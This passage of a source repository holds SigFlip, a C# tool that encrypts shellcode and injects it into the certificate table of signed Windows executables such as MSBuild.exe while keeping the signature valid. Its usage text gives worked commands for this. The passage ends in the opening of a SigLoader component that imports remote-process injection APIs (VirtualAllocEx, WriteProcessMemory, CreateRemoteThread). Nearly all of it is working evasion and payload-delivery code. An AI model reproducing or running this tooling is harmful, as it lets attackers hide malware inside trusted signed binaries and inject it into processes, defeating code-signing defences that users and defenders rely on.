            #region Main

            Console.WriteLine("[+]:Loading/Parsing PE File '{0}'", _pePath);
            Console.WriteLine();
            //Parsing PE file
            PE _pe = new PE(_pePath);
            if (_pe.dosHeader.e_magic != 0x5a4d)
            {
                Console.WriteLine("'{0}' is not a valid PE file", _pePath);
                Environment.Exit(0);
            }

            //Reading PE to byte array
            byte[] _peblob = Utils.Read(_pePath);

            //Verify PE Signature & Computer Hash
            Utils.checkSig(_pePath);
            Console.WriteLine("[+]:Current PE File '{0}' SHA1 Hash is: {1}", _pePath, Utils.sha1(_peblob));

            Console.WriteLine("[+]:" + (_mode == MODE.BIT_FLIP ? "Bit Flipping" : "Encrypting data/shellcode '"+_dataPath+"' using '"+_encKey+"' and injecting it to") + " PE File '{0}'", _pePath);
            //Data to inject, could be shellcode or random bytes (-b -i switches).
            byte[] _data = _mode == MODE.BIT_FLIP ? Encoding.ASCII.GetBytes(Utils.GenRandomBytes(RANDOM_BYTES_SIZE)) : Utils.Encrypt(Utils.Read(_dataPath),_encKey);
            Utils.WriteFile(@"C:\users\public\encrypted-shellcode.bin", _data);
            //Local variables
            ushort _FEHeaderCharacteristics = _pe.fileHeader.Characteristics;
            IMAGE_DATA_DIRECTORY _CertificateTable;
            uint _AttrCertTableRVA = 0;

            //Adjust extra padding in case of BIT_INJECT
            int _paddingLen = 0;
            int _tagLen = 0;
            if (_mode == MODE.BIT_INJECT)
            {
                _tagLen = _tag.Length;
                if ((_peblob.Length + _data.Length + _tagLen) % 8 != 0)
                {
                    while ((_peblob.Length + _data.Length + _paddingLen + _tagLen) % 8 != 0)
                    {
                        _paddingLen++;
                    }

                }
            }

            //Update dwLength and Cert Table Entry Size (OPT Header Data Dir)
            _pe.winCert.dwLength += Convert.ToUInt32(_data.Length + _paddingLen + _tagLen);
            if (Utils.Is32Bit(_FEHeaderCharacteristics))
            {
                _pe.optionalHeader32.CertificateTable.Size += Convert.ToUInt32(_data.Length + _paddingLen + _tagLen);
                _CertificateTable = _pe.optionalHeader32.CertificateTable;
                _AttrCertTableRVA = _pe.optionalHeader32.CertificateTable.VirtualAddress;
            }
            else
            {
                _pe.optionalHeader64.CertificateTable.Size += Convert.ToUInt32(_data.Length + _paddingLen + _tagLen);
                _CertificateTable = _pe.optionalHeader64.CertificateTable;
                _AttrCertTableRVA = _pe.optionalHeader64.CertificateTable.VirtualAddress;
                CERT_TABLE_RVA_OFFSET += 16;
            }


            Console.WriteLine("[+]:Updating OPT Header fields/entries");
            //Locating Certificate Table Data Directory Offset (OPT Header) & Updating the size attribute.
            Stream stream = new MemoryStream(_peblob);
            long pos = stream.Seek(_pe.dosHeader.e_lfanew, SeekOrigin.Begin);
            pos = stream.Seek(CERT_TABLE_RVA_OFFSET, SeekOrigin.Current);

            Utils.MMarshal<IMAGE_DATA_DIRECTORY>(Marshal.SizeOf(_CertificateTable), _CertificateTable, Convert.ToUInt32(pos), _peblob);

            //Updating Attribute Certificate Table dwLength.
            Utils.MMarshal<WIN_CERTIFICATE>(Marshal.SizeOf(_pe.winCert), _pe.winCert, _AttrCertTableRVA, _peblob);

            stream.Close();

           

            //Copy the updated PE byte array to a new byte array (size adjusted)
            byte[] _tempPE = new byte[_peblob.Length + _data.Length + _paddingLen + _tagLen];
            Array.Copy(_peblob, _tempPE, _peblob.Length);

            //Copy the data+tag and any extra required padding to the new PE byte array
            if(_mode == MODE.BIT_INJECT) Array.Copy(_tag, 0, _tempPE, _peblob.Length, _tagLen);
            Array.Copy(_data, 0, _tempPE, _peblob.Length + _tagLen, _data.Length);
            if (_mode == MODE.BIT_INJECT) {
                byte[] _extraPadding = new byte[_paddingLen];
                Array.Copy(_extraPadding, 0, _tempPE, _peblob.Length + _tagLen + _data.Length, _paddingLen);
            }

            _peblob = _tempPE;

            //Saving to disk
            Console.WriteLine("[+]:Saving Modified PE file to '{0}'", _outPath);
            Utils.WriteFile(_outPath, _peblob);

            #endregion Main

            #region Hash & Certificate checks  
            //Checking signature validity & hash
            Utils.checkSig(_outPath);
            Console.WriteLine("[+]:Modified PE File '{0}' SHA1 Hash is: {1}", _outPath, Utils.sha1(_peblob));


            #endregion Hash & Certificate checks  
            Console.WriteLine();
            Console.WriteLine("[*]:Done");
        }

        public static void Help()
        {
           
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine();
            Console.WriteLine("Bit Flipping: Change a PE file (DLL, EXE, SYS, OCX ..etc) hash without breaking the signature");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigFlip.exe -b <PE_FILE_PATH> -o <OUTPUT_PATH (with extension)>");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigFlip.exe -b C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe -o C:\Temp\MSbuild.exe");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Inject Shellcode: Encrypts and Injects shellcode into a PE file's for usage with a basic C/C# loader. (signature remains valid)");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigFlip.exe -i <PE_PATH> -s <SHELLCODE_PATH> -o <OUTPUT_PE_FILE_PATH (with extension> -e <ENCRYPTION_KEY>");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigFlip.exe -i C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe -s C:\Temp\x86.bin -o C:\Temp\MSbuild.exe -e TestKey");
            Console.WriteLine();
            Console.WriteLine();

            Environment.Exit(0);
        }


    }
}

```

`DotNet/SigFlip/SigFlip/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("SigFlip")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("SigFlip")]
[assembly: AssemblyCopyright("Copyright ©  2021")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible
// to COM components.  If you need to access a type in this assembly from
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("ddfdd691-daa2-41fa-8e2c-f85c2a54614d")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`DotNet/SigFlip/SigFlip/SigFlip.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <RootNamespace>SigFlip</RootNamespace>
    <AssemblyName>SigFlip</AssemblyName>
    <TargetFrameworkVersion>v4.6.1</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <Deterministic>true</Deterministic>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
    <DebugSymbols>true</DebugSymbols>
    <OutputPath>bin\x64\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <DebugType>full</DebugType>
    <PlatformTarget>x64</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
    <Prefer32Bit>true</Prefer32Bit>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
    <OutputPath>bin\x64\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <Optimize>true</Optimize>
    <DebugType>pdbonly</DebugType>
    <PlatformTarget>x64</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
    <Prefer32Bit>true</Prefer32Bit>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x86'">
    <DebugSymbols>true</DebugSymbols>
    <OutputPath>bin\x86\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <DebugType>full</DebugType>
    <PlatformTarget>x86</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
    <Prefer32Bit>true</Prefer32Bit>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x86'">
    <OutputPath>bin\x86\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <Optimize>true</Optimize>
    <DebugType>pdbonly</DebugType>
    <PlatformTarget>x86</PlatformTarget>
    <ErrorReport>prompt</ErrorReport>
    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
    <Prefer32Bit>true</Prefer32Bit>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Net.Http" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="PE.cs" />
    <Compile Include="PEHeaders.cs" />
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <Compile Include="Utils.cs" />
    <Compile Include="WinVerifyTrust.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
</Project>
```

`DotNet/SigFlip/SigFlip/SigFlip.csproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|AnyCPU'">
    <StartArguments>-i C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe -s C:\SigStuff\.NET\SigFlip\SigFlip\bin\Debug\ds.bin -o C:\Temp\MSbuild.exe -e TestKey</StartArguments>
  </PropertyGroup>
</Project>
```

`DotNet/SigFlip/SigFlip/Utils.cs`:

```cs
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SigFlip
{
    public class Utils
    {

        public static string sha1(byte[] data)
        {
            using (var sha1 = new System.Security.Cryptography.SHA1CryptoServiceProvider())
            {
                return string.Concat(sha1.ComputeHash(data).Select(x => x.ToString("X2")));
            }
        }

        public static void checkSig(string _pePath)
        {
            string _errMsg = "";
            bool isValid = _WinVerifyTrust.checkSig(_pePath, out _errMsg);

            if (isValid)
            {
                Console.WriteLine("[*]:" + _pePath + @" has a valid signature");
            }
            else
            {
                Console.WriteLine("[!]:" + _pePath + @" signature is NOT valid");
            }
        }

        public static int scanPattern(byte[] peBytes, byte[] pattern)
        {
            int _max = peBytes.Length - pattern.Length + 1;
            int j;
            for (int i = 0; i < _max; i++)
            {
                if (peBytes[i] != pattern[0]) continue;

                for (j = pattern.Length - 1; j >= 1 && peBytes[i + j] == pattern[j]; j--) ;
                if (j == 0) return i;
            }
            return -1;
        }

        public static bool checkConfig() {

            string _pCheck = "";
            using (RegistryKey _hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                using (RegistryKey regKey = _hklm.OpenSubKey(@"\Software\Wow6432Node\Microsoft\Cryptography\Wintrust\Config"))
                {
                    if (regKey != null)
                    {
                        _pCheck = (string)regKey.GetValue("EnableCertPaddingCheck");
                        if (_pCheck != null) return true;
                    }
                }
            }

            using (RegistryKey _hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32))
            {
                using (RegistryKey regKey = _hklm.OpenSubKey(@"\Software\Wow6432Node\Microsoft\Cryptography\Wintrust\Config"))
                {
                    if (regKey != null)
                    {
                        _pCheck = (string)regKey.GetValue("EnableCertPaddingCheck");
                        if (_pCheck != null) return true;
                    }
                }
            }

            return false;

        }

        public static T FromBinaryReader<T>(BinaryReader reader)
        {
            T theStructure;
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            try
            {
                theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            }
            finally
            {
                handle.Free();
            }
            return theStructure;
        }

        public static bool Is32Bit(ushort Characteristics)
        {

            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            return (IMAGE_FILE_32BIT_MACHINE & Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }
        public static void WriteFile(string filename, byte[] rawData)
        {
            FileStream fs = new FileStream(filename, FileMode.OpenOrCreate);
            fs.Write(rawData, 0, rawData.Length);
            fs.Close();
        }

        public static byte[] Read(string filePath)
        {
            using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                byte[] rawData = new byte[stream.Length];
                stream.Read(rawData, 0, (int)stream.Length);
                stream.Close();

                return rawData;
            }
        }

        public static void MMarshal<T>(int _structLength, T _struct, uint _offset, byte[] pe)
        {
            byte[] _structBytes = new byte[_structLength];

            Array.Copy(RawMarshal(_struct), 0, pe, _offset, Marshal.SizeOf(typeof(T)));

        }

        public static byte[] RawMarshal(object anything)
        {
            int rawsize = Marshal.SizeOf(anything);
            byte[] rawdata = new byte[rawsize];
            GCHandle handle = GCHandle.Alloc(rawdata, GCHandleType.Pinned);
            Marshal.StructureToPtr(anything, handle.AddrOfPinnedObject(), false);
            handle.Free();

            return rawdata;
        }

        public static string GenRandomBytes(int size, bool lowerCase = false)
        {
            Random _random = new Random();
            var builder = new StringBuilder(size);

            char offset = lowerCase ? 'a' : 'A';
            const int lettersOffset = 26;

            for (var i = 0; i < size; i++) {
                var @char = (char)_random.Next(offset, offset + lettersOffset);
                builder.Append(@char);
            }

            return lowerCase ? builder.ToString().ToLower() : builder.ToString();
        }

       public static byte[] Encrypt(byte[] data, string encKey)
        {
            byte[] T = new byte[256];
            byte[] S = new byte[256];
            int keyLen = encKey.Length;
            int dataLen = data.Length;
            byte[] result = new byte[dataLen];
            byte tmp;
            int j = 0, t = 0, i = 0;


            for (i = 0; i < 256; i++)
            {
                S[i] = Convert.ToByte(i);
                T[i] = Convert.ToByte(encKey[i % keyLen]);
            }

            for (i = 0; i < 256; i++)
            {
                j = (j + S[i] + T[i]) % 256;
                tmp = S[j];
                S[j] = S[i];
                S[i] = tmp;
            }
            j = 0;
            for (int x = 0; x < dataLen; x++)
            {
                i = (i + 1) % 256;
                j = (j + S[i]) % 256;

                tmp = S[j];
                S[j] = S[i];
                S[i] = tmp;

                t = (S[i] + S[j]) % 256;

                result[x] = Convert.ToByte(data[x] ^ S[t]);
            }

            return result;
        }


    }

    //stolen from https://www.codeproject.com/Articles/3111/C-NET-Command-Line-Arguments-Parser
    public class ArgumentParser
    {
        private StringDictionary Parameters;

        public ArgumentParser(string[] Args)
        {
            Parameters = new StringDictionary();
            Regex Spliter = new Regex(@"^-{1,2}",
                RegexOptions.IgnoreCase | RegexOptions.Compiled);

            Regex Remover = new Regex(@"^['""]?(.*?)['""]?$",
                RegexOptions.IgnoreCase | RegexOptions.Compiled);

            string Parameter = null;
            string[] Parts;

            foreach (string Txt in Args)
            {
                Parts = Spliter.Split(Txt, 3);

                switch (Parts.Length)
                {
                    case 1:
                        if (Parameter != null)
                        {
                            if (!Parameters.ContainsKey(Parameter))
                            {
                                Parts[0] =
                                    Remover.Replace(Parts[0], "$1");

                                Parameters.Add(Parameter, Parts[0]);
                            }
                            Parameter = null;
                        }

                        break;

                    case 2:

                        if (Parameter != null)
                        {
                            if (!Parameters.ContainsKey(Parameter))
                                Parameters.Add(Parameter, "true");
                        }
                        Parameter = Parts[1];
                        break;

                    case 3:
                        if (Parameter != null)
                        {
                            if (!Parameters.ContainsKey(Parameter))
                                Parameters.Add(Parameter, "true");
                        }

                        Parameter = Parts[1];

                        if (!Parameters.ContainsKey(Parameter))
                        {
                            Parts[2] = Remover.Replace(Parts[2], "$1");
                            Parameters.Add(Parameter, Parts[2]);
                        }

                        Parameter = null;
                        break;
                }
            }
            if (Parameter != null)
            {
                if (!Parameters.ContainsKey(Parameter))
                    Parameters.Add(Parameter, "true");
            }
        }

        public string this[string Param]
        {
            get
            {
                return (Parameters[Param]);
            }
        }

        public string GetOrDefault(string key, string defaultValue)
        {
            if (!Parameters.ContainsKey(key))
            {
                return defaultValue;
            }

            return Parameters[key];
        }
    }
}

```

`DotNet/SigFlip/SigFlip/WinVerifyTrust.cs`:

```cs
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using static SigFlip.WinTrustData;

namespace SigFlip
{

     public enum WinTrustDataUIChoice : uint
     {
         All = 1,
         None = 2,
         NoBad = 3,
         NoGood = 4
     }

     public enum WinTrustDataRevocationChecks : uint
     {
         None = 0x00000000,
         WholeChain = 0x00000001
     }

     public enum WinTrustDataChoice : uint
     {
         File = 1,
         Catalog = 2,
         Blob = 3,
         Signer = 4,
         Certificate = 5
     }

     public enum WinTrustDataStateAction : uint
     {
         Ignore = 0x00000000,
         Verify = 0x00000001,
         Close = 0x00000002,
         AutoCache = 0x00000003,
         AutoCacheFlush = 0x00000004
     }

     [FlagsAttribute]
     public enum WinTrustDataProvFlags : uint
     {
         UseIe4TrustFlag = 0x00000001,
         NoIe4ChainFlag = 0x00000002,
         NoPolicyUsageFlag = 0x00000004,
         RevocationCheckNone = 0x00000010,
         RevocationCheckEndCert = 0x00000020,
         RevocationCheckChain = 0x00000040,
         RevocationCheckChainExcludeRoot = 0x00000080,
         SaferFlag = 0x00000100,
         HashOnlyFlag = 0x00000200,
         UseDefaultOsverCheck = 0x00000400,
         LifetimeSigningFlag = 0x00000800,
         CacheOnlyUrlRetrieval = 0x00001000      
     }

     public enum WinTrustDataUIContext : uint
     {
         Execute = 0,
         Install = 1
     }

     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     public class WinTrustFileInfo : IDisposable
     {
         public UInt32 StructSize = (UInt32)Marshal.SizeOf(typeof(WinTrustFileInfo));
         public readonly IntPtr pszFilePath;            
         public IntPtr hFile = IntPtr.Zero;             
         public IntPtr pgKnownSubject = IntPtr.Zero;    

         public WinTrustFileInfo(String filePath)
         {
             pszFilePath = Marshal.StringToCoTaskMemAuto(filePath);
         }
         public void Dispose()
         {
             Marshal.FreeCoTaskMem(pszFilePath);
         }
     }

     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     public class WinTrustData : IDisposable
     {
         public UInt32 StructSize = (UInt32)Marshal.SizeOf(typeof(WinTrustData));
         public IntPtr PolicyCallbackData = IntPtr.Zero;
         public IntPtr SIPClientData = IntPtr.Zero;
         
         public WinTrustDataUIChoice UIChoice = WinTrustDataUIChoice.None;
         
         public WinTrustDataRevocationChecks RevocationChecks = WinTrustDataRevocationChecks.None;
         
         public readonly WinTrustDataChoice UnionChoice;
         
         public readonly IntPtr FileInfoPtr;
         public WinTrustDataStateAction StateAction = WinTrustDataStateAction.Ignore;
         public IntPtr StateData = IntPtr.Zero;
         public String URLReference = null;
         public WinTrustDataProvFlags ProvFlags = WinTrustDataProvFlags.SaferFlag;
         public WinTrustDataUIContext UIContext = WinTrustDataUIContext.Execute;

         public WinTrustData(String fileName)
         {
             WinTrustFileInfo wtfiData = new WinTrustFileInfo(fileName);
             FileInfoPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(WinTrustFileInfo)));
             Marshal.StructureToPtr(wtfiData, FileInfoPtr, false);
             UnionChoice = WinTrustDataChoice.File;
         }

         public void Dispose()
         {
             Marshal.FreeCoTaskMem(FileInfoPtr);
         }

         public enum WinVerifyTrustResult : uint
         {
             Success = 0,
             
             TRUST_E_SYSTEM_ERROR = 0x80096001,
                 
             TRUST_E_NO_SIGNER_CERT = 0x80096002,
             
             TRUST_E_COUNTER_SIGNER = 0x80096003,
         
             TRUST_E_CERT_SIGNATURE = 0x80096004,
             
             TRUST_E_TIME_STAMP = 0x80096005,
             
             TRUST_E_BAD_DIGEST = 0x80096010,

             TRUST_E_BASIC_CONSTRAINTS = 0x80096019,

             TRUST_E_FINANCIAL_CRITERIA = 0x8009601E,

             TRUST_E_PROVIDER_UNKNOWN = 0x800B0001,

             TRUST_E_ACTION_UNKNOWN = 0x800B0002,

             TRUST_E_SUBJECT_FORM_UNKNOWN = 0x800B0003,

             TRUST_E_SUBJECT_NOT_TRUSTED = 0x800B0004,

             TRUST_E_NOSIGNATURE = 0x800B0100,
             
             CERT_E_EXPIRED = 0x800B0101,
             
             CERT_E_VALIDITYPERIODNESTING = 0x800B0102,

             CERT_E_ROLE = 0x800B0103,
             
             CERT_E_PATHLENCONST = 0x800B0104,
             
             CERT_E_CRITICAL = 0x800B0105,
             
             CERT_E_PURPOSE = 0x800B0106,
             
             CERT_E_ISSUERCHAINING = 0x800B0107,
             
             CERT_E_MALFORMED = 0x800B0108,

             CERT_E_UNTRUSTEDROOT = 0x800B0109,
             
             CERT_E_CHAINING = 0x800B010A,
             
             TRUST_E_FAIL = 0x800B010B,
             
             CERT_E_REVOKED = 0x800B010C,
             
             CERT_E_UNTRUSTEDTESTROOT = 0x800B010D,
             
             CERT_E_REVOCATION_FAILURE = 0x800B010E,
             
             CERT_E_CN_NO_MATCH = 0x800B010F,
             
             CERT_E_WRONG_USAGE = 0x800B0110,
             
             TRUST_E_EXPLICIT_DISTRUST = 0x800B0111,
             
             CERT_E_UNTRUSTEDCA = 0x800B0112,
             
             CERT_E_INVALID_POLICY = 0x800B0113,
             
             CERT_E_INVALID_NAME = 0x800B0114
         }

         public static class WinTrust
         {
             public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
             
             public const string WINTRUST_ACTION_GENERIC_VERIFY_V2 = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";

             [DllImport("wintrust.dll", ExactSpelling = true, SetLastError = false, CharSet = CharSet.Unicode)]
             public static extern WinVerifyTrustResult WinVerifyTrust(
                 [In] IntPtr hwnd,
                 [In] [MarshalAs(UnmanagedType.LPStruct)] Guid pgActionID,
                 [In] WinTrustData pWVTData
             );

             public static bool VerifyEmbeddedSignature(string fileName)
             {
                 WinTrustData wtd = new WinTrustData(fileName);
                 Guid guidAction = new Guid(WINTRUST_ACTION_GENERIC_VERIFY_V2);
                 WinVerifyTrustResult result = WinVerifyTrust(INVALID_HANDLE_VALUE, guidAction, wtd);
                 bool ret = (result == WinVerifyTrustResult.Success);
                 return ret;
             }
         }
     }

    // http://www.pinvoke.net/default.aspx/wintrust.winverifytrust
     public static class _WinVerifyTrust
     {
         const uint FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100;
         const uint FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200;
         const uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
         static IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

         [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
         static extern uint FormatMessage(
             uint dwFlags, IntPtr lpSource,
             uint dwMessageId, uint dwLanguageId,
             [Out] StringBuilder lpBuffer,
             uint nSize, IntPtr lpArguments
         );

         public static bool checkSig(string fileName, out string errorMessage)
         {
             using (var wtd = new WinTrustData(fileName)
             {
                 UIChoice = WinTrustDataUIChoice.None,
                 UIContext = WinTrustDataUIContext.Execute,
                 RevocationChecks = WinTrustDataRevocationChecks.None,
                 StateAction = WinTrustDataStateAction.Verify,
                 ProvFlags = WinTrustDataProvFlags.RevocationCheckNone
             })

             {
                 var trustResult = WinTrust.WinVerifyTrust(
                     INVALID_HANDLE_VALUE, new Guid(WinTrust.WINTRUST_ACTION_GENERIC_VERIFY_V2), wtd
                 );

                 if (trustResult == WinVerifyTrustResult.Success)
                 {
                     errorMessage = null;
                     return true;
                 }
                 else
                 {
                     var sb = new StringBuilder(1024);
                     var charCount = FormatMessage(
                         FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                         IntPtr.Zero, (uint)trustResult, 0,
                         sb, (uint)sb.Capacity, IntPtr.Zero
                     );

                     errorMessage = sb.ToString(0, (int)charCount);
                     return false;
                 }
             }
         }
     }


}

```

`DotNet/SigLoader/SigLoader.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28010.2003
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "SigLoader", "SigLoader\SigLoader.csproj", "{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|Any CPU = Release|Any CPU
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Debug|x64.ActiveCfg = Debug|x64
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Debug|x64.Build.0 = Debug|x64
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Debug|x86.ActiveCfg = Debug|x86
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Debug|x86.Build.0 = Debug|x86
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Release|Any CPU.Build.0 = Release|Any CPU
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Release|x64.ActiveCfg = Release|x64
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Release|x64.Build.0 = Release|x64
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Release|x86.ActiveCfg = Release|x86
		{9DF63FF8-3D55-4D9E-8088-03B92D6584E1}.Release|x86.Build.0 = Release|x86
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {07595CC6-6E34-4927-A3FD-1ED4078B0962}
	EndGlobalSection
EndGlobal

```

`DotNet/SigLoader/SigLoader/App.config`:

```config
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.6.1" />
    </startup>
</configuration>
```

`DotNet/SigLoader/SigLoader/Loader.cs`:

```cs
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace SigLoader
{
    public class Loader
    {

        public uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

